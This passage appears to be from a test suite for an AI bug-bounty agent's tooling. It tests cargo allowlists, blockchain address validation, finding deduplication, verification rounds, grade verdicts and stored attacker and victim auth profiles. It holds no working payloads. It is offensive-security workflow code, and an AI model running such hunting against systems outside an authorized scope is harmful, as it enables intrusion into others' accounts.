  const compileErr = classifyCosmwasmFailure(
    { ok: false, exit_code: 1, stderr: "", stdout: "error[E0599]: no method named foo" },
    false,
  );
  assert.equal(compileErr, "cargo_compile_failed");
});

test("substrate runner rejects extra_args not in the cargo allowlist (Phase 6b)", async () => {
  const { runSubstrateTest } = require("../mcp/lib/substrate-runner.js");
  // Need a real Cargo.toml to pass the harness path check. Use a temp dir.
  const tmpRoot = path.join(os.homedir(), "bob-substrate-allowlist-test-" + Math.random().toString(36).slice(2));
  fs.mkdirSync(tmpRoot, { recursive: true });
  fs.writeFileSync(path.join(tmpRoot, "Cargo.toml"), "[package]\nname = \"test\"\nversion = \"0.1.0\"\n");
  try {
    await assert.rejects(async () => runSubstrateTest({
      workdir: tmpRoot,
      matchTest: "test_x",
      network: null,
      extraArgs: ["--release"],
      timeoutMs: 5000,
    }), /not in the substrate cargo allowlist/);
    // Phase 6 fix-up #5: --workspace is intentionally NOT allowlisted; running
    // tests across every workspace member compounds compile-time blast radius.
    await assert.rejects(async () => runSubstrateTest({
      workdir: tmpRoot,
      matchTest: "test_x",
      network: null,
      extraArgs: ["--workspace"],
      timeoutMs: 5000,
    }), /not in the substrate cargo allowlist/);
  } finally {
    fs.rmSync(tmpRoot, { recursive: true, force: true });
  }
});

test("cosmwasm runner rejects extra_args not in the cargo allowlist (Phase 6b)", async () => {
  const { runCosmwasmTest } = require("../mcp/lib/cosmwasm-runner.js");
  const tmpRoot = path.join(os.homedir(), "bob-cosmwasm-allowlist-test-" + Math.random().toString(36).slice(2));
  fs.mkdirSync(tmpRoot, { recursive: true });
  fs.writeFileSync(path.join(tmpRoot, "Cargo.toml"), "[package]\nname = \"test\"\nversion = \"0.1.0\"\n");
  try {
    await assert.rejects(async () => runCosmwasmTest({
      workdir: tmpRoot,
      matchTest: "test_x",
      network: null,
      extraArgs: ["--target=wasm32-unknown-unknown"],
      timeoutMs: 5000,
    }), /not in the cosmwasm cargo allowlist/);
  } finally {
    fs.rmSync(tmpRoot, { recursive: true, force: true });
  }
});

test("substrate runner rejects harness without Cargo.toml at root (Phase 6b)", async () => {
  const { runSubstrateTest } = require("../mcp/lib/substrate-runner.js");
  const tmpRoot = path.join(os.homedir(), "bob-substrate-no-cargo-" + Math.random().toString(36).slice(2));
  fs.mkdirSync(tmpRoot, { recursive: true });
  try {
    await assert.rejects(async () => runSubstrateTest({
      workdir: tmpRoot,
      matchTest: "test_x",
      network: null,
      timeoutMs: 5000,
    }), /must contain Cargo.toml at the root/);
  } finally {
    fs.rmSync(tmpRoot, { recursive: true, force: true });
  }
});

test("cosmwasm runner rejects harness without Cargo.toml at root (Phase 6b)", async () => {
  const { runCosmwasmTest } = require("../mcp/lib/cosmwasm-runner.js");
  const tmpRoot = path.join(os.homedir(), "bob-cosmwasm-no-cargo-" + Math.random().toString(36).slice(2));
  fs.mkdirSync(tmpRoot, { recursive: true });
  try {
    await assert.rejects(async () => runCosmwasmTest({
      workdir: tmpRoot,
      matchTest: "test_x",
      network: null,
      timeoutMs: 5000,
    }), /must contain Cargo.toml at the root/);
  } finally {
    fs.rmSync(tmpRoot, { recursive: true, force: true });
  }
});

test("bech32 mixed-case rejection happens at findings layer with stable error shape (Phase 6 fix-up #6)", () => {
  const { normalizeBech32Address } = require("../mcp/lib/findings.js");
  // BIP-0173 forbids mixed-case bech32 — the spec is explicit. We test the
  // normalizer directly so it's clear which layer enforces this.
  assert.equal(normalizeBech32Address("Osmo1qypqxpq9qcrsszg2pvxq6rs0zqg3yyc5z5tpwxqergd3c8g7rusq4z5ese"), null);
  assert.equal(normalizeBech32Address("OSMO1qypqxpq9qcrsszg2pvxq6rs0zqg3yyc5z5tpwxqergd3c8g7rusq4z5ese"), null);
  // All-uppercase is accepted (BIP-0173 allows it; we lowercase for dedup).
  assert.equal(
    normalizeBech32Address("OSMO1QYPQXPQ9QCRSSZG2PVXQ6RS0ZQG3YYC5Z5TPWXQERGD3C8G7RUSQ4Z5ESE"),
    "osmo1qypqxpq9qcrsszg2pvxq6rs0zqg3yyc5z5tpwxqergd3c8g7rusq4z5ese",
  );
  // Internal whitespace is rejected: bech32 chars are ASCII 33..126, space=32.
  assert.equal(normalizeBech32Address("osmo1qypq xpq9"), null);
});

test("substrate-client rejects malformed SS58 (Phase 6b)", () => {
  const { isSs58Address } = require("../mcp/lib/substrate-client.js");
  assert.equal(isSs58Address("5GrwvaEF5zXb26Fz9rcQpDWS57CtERHpNehXCPcNoHGKutQY"), true);
  assert.equal(isSs58Address("0x" + "ab".repeat(20)), false);
  assert.equal(isSs58Address("osmo1qypqxpq9qcrsszg2pvxq6rs0zqg3yyc5"), false);
  assert.equal(isSs58Address("short"), false);
  assert.equal(isSs58Address(""), false);
});

test("cosmwasm-client rejects malformed bech32 (Phase 6b)", () => {
  const { isBech32Address } = require("../mcp/lib/cosmwasm-client.js");
  assert.equal(isBech32Address("osmo1qypqxpq9qcrsszg2pvxq6rs0zqg3yyc5z5tpwxqergd3c8g7rusq4z5ese"), true);
  assert.equal(isBech32Address("0x" + "ab".repeat(20)), false);
  assert.equal(isBech32Address("5GrwvaEF5zXb26Fz9rcQpDWS57CtERHpNehXCPcNoHGKutQY"), false);
  assert.equal(isBech32Address("noseparator"), false);
});

test("sc_evidence rejects EVM-canonical 40-hex address when chain_family is aptos or sui (Phase 5 fix-up #1)", () => {
  const { normalizeFindingRecord } = require("../mcp/lib/findings.js");
  // A hunter pastes Vitalik's address (or any 0x + 40 hex EVM address) into a
  // Move-family sc_evidence. Without the EVM-shape rejection, the address
  // would silently be left-padded to 64 hex and stored as a Move address
  // belonging to the wrong family. The new check refuses 0x + 40 hex.
  const evmAddress = "0x742d35Cc6634C0532925a3b844Bc9e7595f7AbCD";
  for (const family of ["aptos", "sui"]) {
    const networkValue = family === "aptos" ? "mainnet" : "mainnet";
    assert.throws(() => normalizeFindingRecord({
      id: "F-1",
      target_domain: "example.com",
      title: "x",
      severity: "low",
      cwe: null,
      endpoint: "x",
      description: "x",
      proof_of_concept: "y",
      response_evidence: null,
      impact: null,
      validated: true,
      wave: null,
      agent: null,
      surface_id: null,
      surface_type: "smart_contract",
      sc_evidence: {
        chain_family: family,
        chain_id: networkValue,
        contract_address: evmAddress,
        harness_path: os.homedir(),
        match_test: "test_x",
      },
    }), /looks like a canonical EVM address.*chain_family='/, `Move family '${family}' must reject EVM 40-hex shape`);
  }
  // Real Move addresses with 12 leading zero bytes are still accepted in
  // canonical 64-hex form.
  const finding = normalizeFindingRecord({
    id: "F-1",
    target_domain: "example.com",
    title: "x",
    severity: "low",
    cwe: null,
    endpoint: "x",
    description: "x",
    proof_of_concept: "y",
    response_evidence: null,
    impact: null,
    validated: true,
    wave: null,
    agent: null,
    surface_id: null,
    surface_type: "smart_contract",
    sc_evidence: {
      chain_family: "aptos",
      chain_id: "mainnet",
      contract_address: "0x" + "0".repeat(24) + "742d35cc6634c0532925a3b844bc9e7595f7abcd",
      harness_path: os.homedir(),
      match_test: "test_x",
    },
  });
  assert.equal(
    finding.sc_evidence.contract_address,
    "0x" + "0".repeat(24) + "742d35cc6634c0532925a3b844bc9e7595f7abcd",
    "canonical 64-hex address with 12 leading zero bytes is still accepted",
  );
});

test("aptos runner classifies CLI usage errors as aptos_dependency_missing (Phase 5 fix-up #4)", () => {
  const { classifyAptosFailure } = require("../mcp/lib/aptos-runner.js");
  // Old aptos CLI (pre-1.0) doesn't support --package-dir.
  const oldPackageDir = classifyAptosFailure(
    { ok: false, exit_code: 1, stderr: "error: unrecognized argument --package-dir", stdout: "" },
    false,
  );
  assert.equal(oldPackageDir, "aptos_dependency_missing");
  const wrongFlag = classifyAptosFailure(
    { ok: false, exit_code: 1, stderr: "error: Found argument '--filter' which wasn't expected, or isn't valid in this context", stdout: "" },
    false,
  );
  assert.equal(wrongFlag, "aptos_dependency_missing");
  const missingPositional = classifyAptosFailure(
    { ok: false, exit_code: 1, stderr: "error: The following required arguments were not provided:\n  <PACKAGE_PATH>", stdout: "" },
    false,
  );
  assert.equal(missingPositional, "aptos_dependency_missing");
});

test("sui runner classifies CLI usage errors as sui_dependency_missing (Phase 5 fix-up #5)", () => {
  const { classifySuiFailure } = require("../mcp/lib/sui-runner.js");
  // Older sui CLIs may not accept --filter / --path.
  const oldFilter = classifySuiFailure(
    { ok: false, exit_code: 1, stderr: "error: unrecognized argument --filter", stdout: "" },
    false,
  );
  assert.equal(oldFilter, "sui_dependency_missing");
  const oldPath = classifySuiFailure(
    { ok: false, exit_code: 1, stderr: "error: unexpected argument '--path' found", stdout: "" },
    false,
  );
  assert.equal(oldPath, "sui_dependency_missing");
});

test("Move tools register with verifier role bundle (so balanced/brutalist/final can re-run Aptos/Sui PoCs)", () => {
  const tools = [
    "bounty_aptos_fetch_resource",
    "bounty_aptos_fetch_module",
    "bounty_aptos_run",
    "bounty_sui_fetch_object",
    "bounty_sui_fetch_package",
    "bounty_sui_run",
  ];
  for (const name of tools) {
    const meta = TOOL_MANIFEST[name];
    assert.ok(meta, `${name} is in TOOL_MANIFEST`);
    assert.deepEqual(meta.role_bundles, ["hunter", "verifier"], `${name} exposes role_bundles=[hunter, verifier]`);
    assert.equal(meta.network_access, true, `${name} declares network_access`);
  }
});

test("bounty_record_finding tolerates legacy findings.jsonl rows with no surface_type or sc_evidence", () => {
  withTempHome(() => {
    const domain = "example.com";
    const findingsPath = findingsJsonlPath(domain);
    fs.mkdirSync(path.dirname(findingsPath), { recursive: true });
    // Hand-write a legacy row representing pre-Phase-3a findings.
    const legacy = {
      id: "F-1",
      target_domain: domain,
      title: "IDOR",
      severity: "high",
      cwe: "CWE-639",
      endpoint: "/api/export",
      description: "Cross-account PII",
      proof_of_concept: "curl ...",
      response_evidence: null,
      impact: null,
      validated: true,
      wave: null,
      agent: null,
      surface_id: null,
      auth_profile: null,
      dedupe_key: "deadbeef".repeat(3),
    };
    fs.writeFileSync(findingsPath, JSON.stringify(legacy) + "\n");
    const out = JSON.parse(readFindings({ target_domain: domain }));
    assert.equal(out.findings.length, 1);
    assert.equal(out.findings[0].surface_type, null);
    assert.equal(out.findings[0].sc_evidence, null);
  });
});

test("bounty_record_finding deduplicates exact findings unless force_record is set", () => {
  withTempHome(() => {
    const domain = "example.com";
    const first = seedFinding(domain);
    const duplicate = seedFinding(domain);

    assert.equal(first.finding_id, "F-1");
    assert.equal(duplicate.recorded, false);
    assert.equal(duplicate.duplicate, true);
    assert.equal(duplicate.finding_id, "F-1");
    assert.equal(fs.readFileSync(findingsJsonlPath(domain), "utf8").trim().split("\n").length, 1);

    const forced = seedFinding(domain, { force_record: true });
    assert.equal(forced.recorded, true);
    assert.equal(forced.finding_id, "F-2");
    assert.equal(forced.force_record, true);

    const records = fs.readFileSync(findingsJsonlPath(domain), "utf8").trim().split("\n").map((line) => JSON.parse(line));
    assert.equal(records.length, 2);
    assert.equal(records[1].force_record, true);
    assert.equal(records[0].dedupe_key, records[1].dedupe_key);
  });
});

test("bounty_record_finding returns warning metadata when markdown sync fails after JSONL success", () => {
  withTempHome(() => {
    const domain = "example.com";
    const dir = sessionDir(domain);
    fs.mkdirSync(path.join(dir, "findings.md"), { recursive: true });

    const result = seedFinding(domain);

    assert.equal(result.recorded, true);
    assert.equal(result.finding_id, "F-1");
    assert.ok(result.markdown_sync_error);
    assert.equal(fs.readFileSync(findingsJsonlPath(domain), "utf8").trim().split("\n").length, 1);
    assert.ok(fs.statSync(path.join(dir, "findings.md")).isDirectory());
  });
});

test("bounty_read_findings, bounty_list_findings, and bounty_wave_status return empty-state results when findings.jsonl is absent", () => {
  withTempHome(() => {
    const domain = "example.com";

    assert.deepEqual(JSON.parse(readFindings({ target_domain: domain })), {
      version: 1,
      target_domain: domain,
      findings: [],
    });
    assert.deepEqual(JSON.parse(listFindings({ target_domain: domain })), {
      count: 0,
      findings: [],
    });
    const status = JSON.parse(waveStatus({ target_domain: domain }));
    assert.deepEqual(status, {
      total: 0,
      by_severity: { critical: 0, high: 0, medium: 0, low: 0, info: 0 },
      has_high_or_critical: false,
      coverage: null,
      http_audit: { total: 0, shown: 0, omitted: 0, cap: 0, by_status_class: { "2xx": 0, "3xx": 0, "4xx": 0, "5xx": 0, other: 0 }, errors: 0, scope_blocked: 0, recent: [] },
      traffic: { total: 0, shown: 0, omitted: 0, cap: 0, authenticated_count: 0, by_status_class: { "2xx": 0, "3xx": 0, "4xx": 0, "5xx": 0, other: 0 }, recent: [] },
      circuit_breaker: { threshold: 3, tripped_hosts: [], tripped_count: 0, note: null },
      findings_summary: [],
    });
  });
});

test("malformed findings.jsonl hard-fails bounty_read_findings, bounty_list_findings, and bounty_wave_status", () => {
  withTempHome(() => {
    const domain = "example.com";
    const dir = sessionDir(domain);
    fs.mkdirSync(dir, { recursive: true });
    fs.writeFileSync(
      findingsJsonlPath(domain),
      `${JSON.stringify({
        id: "F-1",
        target_domain: domain,
        title: "Valid first line",
        severity: "low",
        cwe: null,
        endpoint: "/ok",
        description: "Still valid.",
        proof_of_concept: "curl https://example.com/ok",
        response_evidence: null,
        impact: null,
        validated: true,
        wave: null,
        agent: null,
      })}\nnot-json\n`,
    );

    assert.throws(() => readFindings({ target_domain: domain }), /Malformed findings\.jsonl at line 2/);
    assert.throws(() => listFindings({ target_domain: domain }), /Malformed findings\.jsonl at line 2/);
    assert.throws(() => waveStatus({ target_domain: domain }), /Malformed findings\.jsonl at line 2/);
  });
});

test("bounty_list_findings and bounty_wave_status keep their external shapes while reading findings.jsonl", () => {
  withTempHome(() => {
    const domain = "example.com";
    seedFinding(domain, { severity: "critical" });
    seedFinding(domain, {
      title: "Verbose stack trace leak",
      severity: "low",
      endpoint: "/boom",
      description: "Exception page leaks internal paths.",
      proof_of_concept: "curl https://example.com/boom",
      response_evidence: "ReferenceError",
      impact: "Improves exploit development.",
      wave: null,
      agent: null,
    });

    assert.deepEqual(JSON.parse(listFindings({ target_domain: domain })), {
      count: 2,
      findings: [
        {
          id: "F-1",
          severity: "critical",
          title: "IDOR on account export",
          endpoint: "/api/export",
        },
        {
          id: "F-2",
          severity: "low",
          title: "Verbose stack trace leak",
          endpoint: "/boom",
        },
      ],
    });

    assert.deepEqual(JSON.parse(waveStatus({ target_domain: domain })), {
      total: 2,
      by_severity: { critical: 1, high: 0, medium: 0, low: 1, info: 0 },
      has_high_or_critical: true,
      coverage: null,
      http_audit: { total: 0, shown: 0, omitted: 0, cap: 0, by_status_class: { "2xx": 0, "3xx": 0, "4xx": 0, "5xx": 0, other: 0 }, errors: 0, scope_blocked: 0, recent: [] },
      traffic: { total: 0, shown: 0, omitted: 0, cap: 0, authenticated_count: 0, by_status_class: { "2xx": 0, "3xx": 0, "4xx": 0, "5xx": 0, other: 0 }, recent: [] },
      circuit_breaker: { threshold: 3, tripped_hosts: [], tripped_count: 0, note: null },
      findings_summary: [
        {
          id: "F-1",
          severity: "critical",
          title: "IDOR on account export",
          endpoint: "/api/export",
          wave_agent: "w1/a1",
        },
        {
          id: "F-2",
          severity: "low",
          title: "Verbose stack trace leak",
          endpoint: "/boom",
          wave_agent: null,
        },
      ],
    });
  });
});

test("bounty_write_verification_round writes the correct JSON and markdown pair for each round", () => {
  withTempHome(() => {
    const domain = "example.com";
    seedFinding(domain);

    for (const round of ["brutalist", "balanced", "final"]) {
      const result = JSON.parse(writeVerificationRound({
        target_domain: domain,
        round,
        notes: null,
        results: [],
      }));
      const paths = verificationRoundPaths(domain, round);

      assert.equal(result.round, round);
      assert.equal(result.results_count, 0);
      assert.equal(result.written_json, paths.json);
      assert.equal(result.written_md, paths.markdown);

      assert.deepEqual(JSON.parse(fs.readFileSync(paths.json, "utf8")), {
        version: 1,
        target_domain: domain,
        round,
        notes: null,
        results: [],
      });
      assert.match(fs.readFileSync(paths.markdown, "utf8"), /No verification results recorded\./);

      assert.deepEqual(JSON.parse(readVerificationRound({ target_domain: domain, round })), {
        version: 1,
        target_domain: domain,
        round,
        notes: null,
        results: [],
      });
    }
  });
});

test("bounty_write_verification_round accepts notes null and validates duplicate and unknown finding_ids", () => {
  withTempHome(() => {
    const domain = "example.com";
    seedFinding(domain);

    assert.throws(() => writeVerificationRound({
      target_domain: domain,
      round: "brutalist",
      notes: null,
      results: [
        {
          finding_id: "F-1",
          disposition: "confirmed",
          severity: "high",
          reportable: true,
          reasoning: "Still exploitable.",
        },
        {
          finding_id: "F-1",
          disposition: "downgraded",
          severity: "medium",
          reportable: true,
          reasoning: "Duplicate entry should fail.",
        },
      ],
    }), /Duplicate finding_id in results: F-1/);

    assert.throws(() => writeVerificationRound({
      target_domain: domain,
      round: "balanced",
      notes: null,
      results: [
        {
          finding_id: "F-99",
          disposition: "denied",
          severity: null,
          reportable: false,
          reasoning: "Unknown ID.",
        },
      ],
    }), /Unknown finding_id: F-99/);
  });
});

test("bounty_write_verification_round rejects balanced/final rounds that drop prior-round findings", () => {
  withTempHome(() => {
    const domain = "example.com";
    seedFinding(domain);
    seedFinding(domain, { title: "Second finding", endpoint: "/api/second" });

    const fullResult = (id) => ({
      finding_id: id,
      disposition: "confirmed",
      severity: "high",
      reportable: true,
      reasoning: "Valid.",
    });

    // Write brutalist round with both findings
    writeVerificationRound({
      target_domain: domain,
      round: "brutalist",
      notes: null,
      results: [fullResult("F-1"), fullResult("F-2")],
    });

    // Balanced round missing F-2 should fail
    assert.throws(() => writeVerificationRound({
      target_domain: domain,
      round: "balanced",
      notes: null,
      results: [fullResult("F-1")],
    }), /balanced round is missing 1 finding.*F-2/);

    // Balanced round with both findings should succeed
    writeVerificationRound({
      target_domain: domain,
      round: "balanced",
      notes: null,
      results: [fullResult("F-1"), fullResult("F-2")],
    });

    // Final round missing F-1 should fail
    assert.throws(() => writeVerificationRound({
      target_domain: domain,
      round: "final",
      notes: null,
      results: [fullResult("F-2")],
    }), /final round is missing 1 finding.*F-1/);

    // Final round with both findings should succeed
    writeVerificationRound({
      target_domain: domain,
      round: "final",
      notes: null,
      results: [fullResult("F-1"), fullResult("F-2")],
    });
  });
});

test("bounty_write_verification_round requires valid prior round artifacts", () => {
  withTempHome(() => {
    const domain = "example.com";
    seedFinding(domain);

    assert.throws(() => writeVerificationRound({
      target_domain: domain,
      round: "balanced",
      notes: null,
      results: [],
    }), /Missing brutalist verification round JSON/);

    writeVerificationRound({
      target_domain: domain,
      round: "brutalist",
      notes: null,
      results: [],
    });
    assert.throws(() => writeVerificationRound({
      target_domain: domain,
      round: "final",
      notes: null,
      results: [],
    }), /Missing balanced verification round JSON/);
  });
});

test("bounty_read_verification_round hard-fails on missing or malformed JSON", () => {
  withTempHome(() => {
    const domain = "example.com";

    assert.throws(
      () => readVerificationRound({ target_domain: domain, round: "final" }),
      /Missing final verification round JSON/,
    );

    const paths = verificationRoundPaths(domain, "final");
    fs.mkdirSync(path.dirname(paths.json), { recursive: true });
    fs.writeFileSync(paths.json, "{bad json");

    assert.throws(
      () => readVerificationRound({ target_domain: domain, round: "final" }),
      /Malformed final verification round JSON/,
    );
  });
});

test("bounty_read_verification_round rejects JSON that references non-existent findings", () => {
  withTempHome(() => {
    const domain = "example.com";
    seedFinding(domain);

    const paths = verificationRoundPaths(domain, "balanced");
    fs.mkdirSync(path.dirname(paths.json), { recursive: true });
    fs.writeFileSync(paths.json, `${JSON.stringify({
      version: 1,
      target_domain: domain,
      round: "balanced",
      notes: null,
      results: [
        {
          finding_id: "F-99",
          disposition: "denied",
          severity: null,
          reportable: false,
          reasoning: "Manually edited bad artifact.",
        },
      ],
    }, null, 2)}\n`);

    assert.throws(
      () => readVerificationRound({ target_domain: domain, round: "balanced" }),
      /Unknown finding_id: F-99/,
    );
  });
});

test("bounty_write_grade_verdict writes grade.json and grade.md and accepts empty findings", () => {
  withTempHome(() => {
    const domain = "example.com";
    seedFinding(domain);
    seedVerificationPipeline(domain, [{
      finding_id: "F-1",
      disposition: "denied",
      severity: null,
      reportable: false,
      reasoning: "Not reproducible.",
    }]);

    const result = JSON.parse(writeGradeVerdict({
      target_domain: domain,
      verdict: "SKIP",
      total_score: 0,
      findings: [],
      feedback: null,
    }));
    const paths = gradeArtifactPaths(domain);

    assert.equal(result.verdict, "SKIP");
    assert.equal(result.findings_count, 0);
    assert.equal(result.written_json, paths.json);
    assert.equal(result.written_md, paths.markdown);
    assert.deepEqual(JSON.parse(fs.readFileSync(paths.json, "utf8")), {
      version: 1,
      target_domain: domain,
      verdict: "SKIP",
      total_score: 0,
      findings: [],
      feedback: null,
    });
    assert.match(fs.readFileSync(paths.markdown, "utf8"), /No graded findings\./);

    assert.deepEqual(JSON.parse(readGradeVerdict({ target_domain: domain })), {
      version: 1,
      target_domain: domain,
      verdict: "SKIP",
      total_score: 0,
      findings: [],
      feedback: null,
    });
  });
});

test("bounty_write_grade_verdict requires valid final verification before grading", async () => {
  await withTempHome(async () => {
    const domain = "example.com";
    seedFinding(domain);

    const result = await executeTool("bounty_write_grade_verdict", {
      target_domain: domain,
      verdict: "SKIP",
      total_score: 0,
      findings: [],
      feedback: "No graded findings.",
    });

    assert.equal(result.ok, false);
    assert.equal(result.error.code, "STATE_CONFLICT");
    assert.match(result.error.message, /Final verification must exist and be valid before grading/);
    assert.match(result.error.message, /Missing final verification round JSON/);

    const finalPaths = verificationRoundPaths(domain, "final");
    fs.mkdirSync(path.dirname(finalPaths.json), { recursive: true });
    fs.writeFileSync(finalPaths.json, "{bad json");
    const malformed = await executeTool("bounty_write_grade_verdict", {
      target_domain: domain,
      verdict: "SKIP",
      total_score: 0,
      findings: [],
      feedback: "No graded findings.",
    });
    assert.equal(malformed.ok, false);
    assert.equal(malformed.error.code, "STATE_CONFLICT");
    assert.match(malformed.error.message, /Malformed final verification round JSON/);
  });
});

test("bounty_write_grade_verdict enforces score totals, thresholds, and final reportability", () => {
  withTempHome(() => {
    const domain = "example.com";
    seedFinding(domain, { severity: "high" });
    const verified = [{
      finding_id: "F-1",
      disposition: "confirmed",
      severity: "high",
      reportable: true,
      reasoning: "Confirmed.",
    }];
    seedVerificationPipeline(domain, verified);

    const gradeFinding = {
      finding_id: "F-1",
      impact: 20,
      proof_quality: 10,
      severity_accuracy: 5,
      chain_potential: 5,
      report_quality: 5,
      total_score: 45,
      feedback: null,
    };

    const valid = JSON.parse(writeGradeVerdict({
      target_domain: domain,
      verdict: "SUBMIT",
      total_score: 45,
      findings: [gradeFinding],
      feedback: null,
    }));
    assert.equal(valid.verdict, "SUBMIT");

    assert.throws(() => writeGradeVerdict({
      target_domain: domain,
      verdict: "SUBMIT",
      total_score: 44,
      findings: [gradeFinding],
      feedback: null,
    }), /total_score must equal the maximum per-finding score/);

    assert.throws(() => writeGradeVerdict({
      target_domain: domain,
      verdict: "HOLD",
      total_score: 45,
      findings: [gradeFinding],
      feedback: null,
    }), /expected SUBMIT/);
  });
});

test("bounty_write_grade_verdict permits only SKIP when final verification has no medium-or-higher reportable finding", () => {
  withTempHome(() => {
    const domain = "example.com";
    seedFinding(domain, { severity: "high" });
    const unreportable = [{
      finding_id: "F-1",
      disposition: "denied",
      severity: null,
      reportable: false,
      reasoning: "Not reproducible.",
    }];
    seedVerificationPipeline(domain, unreportable);

    const gradeFinding = {
      finding_id: "F-1",
      impact: 20,
      proof_quality: 10,
      severity_accuracy: 5,
      chain_potential: 5,
      report_quality: 5,
      total_score: 45,
      feedback: null,
    };

    const skipped = JSON.parse(writeGradeVerdict({
      target_domain: domain,
      verdict: "SKIP",
      total_score: 45,
      findings: [gradeFinding],
      feedback: "No reportable medium-or-higher finding survived final verification.",
    }));
    assert.equal(skipped.verdict, "SKIP");

    assert.throws(() => writeGradeVerdict({
      target_domain: domain,
      verdict: "SUBMIT",
      total_score: 45,
      findings: [gradeFinding],
      feedback: null,
    }), /expected SKIP/);

    assert.throws(() => writeGradeVerdict({
      target_domain: domain,
      verdict: "HOLD",
      total_score: 45,
      findings: [gradeFinding],
      feedback: null,
    }), /expected SKIP/);
  });
});

test("bounty_write_grade_verdict rejects duplicate or unknown finding_ids", () => {
  withTempHome(() => {
    const domain = "example.com";
    seedFinding(domain);

    assert.throws(() => writeGradeVerdict({
      target_domain: domain,
      verdict: "HOLD",
      total_score: 80,
      findings: [
        {
          finding_id: "F-1",
          impact: 20,
          proof_quality: 20,
          severity_accuracy: 15,
          chain_potential: 10,
          report_quality: 15,
          total_score: 80,
          feedback: null,
        },
        {
          finding_id: "F-1",
          impact: 10,
          proof_quality: 10,
          severity_accuracy: 10,
          chain_potential: 10,
          report_quality: 10,
          total_score: 50,
          feedback: "duplicate",
        },
      ],
      feedback: "Need stronger chain.",
    }), /Duplicate finding_id in findings: F-1/);

    assert.throws(() => writeGradeVerdict({
      target_domain: domain,
      verdict: "SUBMIT",
      total_score: 80,
      findings: [
        {
          finding_id: "F-99",
          impact: 20,
          proof_quality: 20,
          severity_accuracy: 15,
          chain_potential: 10,
          report_quality: 15,
          total_score: 80,
          feedback: null,
        },
      ],
      feedback: null,
    }), /Unknown finding_id: F-99/);
  });
});

test("bounty_read_grade_verdict hard-fails on missing or malformed JSON", () => {
  withTempHome(() => {
    const domain = "example.com";
    const paths = gradeArtifactPaths(domain);

    assert.throws(
      () => readGradeVerdict({ target_domain: domain }),
      /Missing grade verdict JSON/,
    );

    fs.mkdirSync(path.dirname(paths.json), { recursive: true });
    fs.writeFileSync(paths.json, "{bad json");

    assert.throws(
      () => readGradeVerdict({ target_domain: domain }),
      /Malformed grade verdict JSON/,
    );
  });
});

test("bounty_read_grade_verdict rejects grade artifacts when final verification is missing", async () => {
  await withTempHome(async () => {
    const domain = "example.com";
    seedFinding(domain);
    const paths = gradeArtifactPaths(domain);
    fs.mkdirSync(path.dirname(paths.json), { recursive: true });
    fs.writeFileSync(paths.json, `${JSON.stringify({
      version: 1,
      target_domain: domain,
      verdict: "SKIP",
      total_score: 0,
      findings: [],
      feedback: null,
    }, null, 2)}\n`);

    const result = await executeTool("bounty_read_grade_verdict", { target_domain: domain });
    assert.equal(result.ok, false);
    assert.equal(result.error.code, "STATE_CONFLICT");
    assert.match(result.error.message, /Final verification must exist and be valid before grading/);
  });
});

test("bounty_read_grade_verdict rejects JSON that references non-existent findings", () => {
  withTempHome(() => {
    const domain = "example.com";
    seedFinding(domain);

    const paths = gradeArtifactPaths(domain);
    fs.mkdirSync(path.dirname(paths.json), { recursive: true });
    fs.writeFileSync(paths.json, `${JSON.stringify({
      version: 1,
      target_domain: domain,
      verdict: "HOLD",
      total_score: 10,
      findings: [
        {
          finding_id: "F-99",
          impact: 2,
          proof_quality: 2,
          severity_accuracy: 2,
          chain_potential: 2,
          report_quality: 2,
          total_score: 10,
          feedback: null,
        },
      ],
      feedback: "Bad manual edit.",
    }, null, 2)}\n`);

    assert.throws(
      () => readGradeVerdict({ target_domain: domain }),
      /Unknown finding_id: F-99/,
    );
  });
});

// ── bounty_auth_store tests ──

test("bounty_auth_store writes v2 auth.json with attacker profile", async () => {
  const tempHome = fs.mkdtempSync(path.join(os.tmpdir(), "bountyagent-test-"));
  const previousHome = process.env.HOME;
  process.env.HOME = tempHome;
  try {
    const sessionsDir = path.join(tempHome, "bounty-agent-sessions");
    fs.mkdirSync(path.join(sessionsDir, "target.com"), { recursive: true });

    const result = await executeTool("bounty_auth_store", {
      target_domain: "target.com",
      profile_name: "attacker",
      headers: { "Authorization": "Bearer atok" },
      cookies: { "session": "abc123" },
    });

    assert.equal(result.ok, true);
    assert.equal(result.data.success, true);
    assert.equal(result.data.profile_name, "attacker");
    assert.equal(result.data.has_attacker, true);
    assert.equal(result.data.has_victim, false);

    const saved = JSON.parse(fs.readFileSync(path.join(sessionsDir, "target.com", "auth.json"), "utf8"));
    assert.equal(saved.version, 2);
    assert.ok(saved.profiles.attacker);
    assert.equal(saved.profiles.attacker.Authorization, "Bearer atok");
    assert.equal(saved.profiles.attacker.Cookie, "session=abc123");
  } finally {
    process.env.HOME = previousHome;
    fs.rmSync(tempHome, { recursive: true, force: true });
  }
});

test("bounty_auth_store adds victim profile to existing v2 auth.json", async () => {
  const tempHome = fs.mkdtempSync(path.join(os.tmpdir(), "bountyagent-test-"));
  const previousHome = process.env.HOME;
  process.env.HOME = tempHome;
  try {
    const sessionsDir = path.join(tempHome, "bounty-agent-sessions");
    const targetDir = path.join(sessionsDir, "target.com");
    fs.mkdirSync(targetDir, { recursive: true });

    // Write attacker first
    await executeTool("bounty_auth_store", {
      target_domain: "target.com",
      profile_name: "attacker",
      headers: { "Authorization": "Bearer atok" },
    });

    // Now add victim
    const result = await executeTool("bounty_auth_store", {
      target_domain: "target.com",
      profile_name: "victim",
      headers: { "Authorization": "Bearer vtok" },
    });

    assert.equal(result.ok, true);
    assert.equal(result.data.success, true);
    assert.equal(result.data.has_attacker, true);
    assert.equal(result.data.has_victim, true);

    const saved = JSON.parse(fs.readFileSync(path.join(targetDir, "auth.json"), "utf8"));
    assert.equal(saved.version, 2);
    assert.equal(saved.profiles.attacker.Authorization, "Bearer atok");
    assert.equal(saved.profiles.victim.Authorization, "Bearer vtok");
  } finally {
    process.env.HOME = previousHome;
    fs.rmSync(tempHome, { recursive: true, force: true });
  }
});

test("bounty_auth_store accepts arbitrary profile names without clobbering existing profiles", async () => {
  await withTempHome(async () => {
    await executeTool("bounty_auth_store", {
      target_domain: "target.com",
      profile_name: "attacker",
      headers: { Authorization: "Bearer attacker" },
    });
    await executeTool("bounty_auth_store", {
      target_domain: "target.com",
      profile_name: "tenant_b",
      headers: { Authorization: "Bearer tenant-b" },
    });

    const saved = JSON.parse(fs.readFileSync(path.join(sessionDir("target.com"), "auth.json"), "utf8"));
    assert.equal(saved.profiles.attacker.Authorization, "Bearer attacker");
    assert.equal(saved.profiles.tenant_b.Authorization, "Bearer tenant-b");
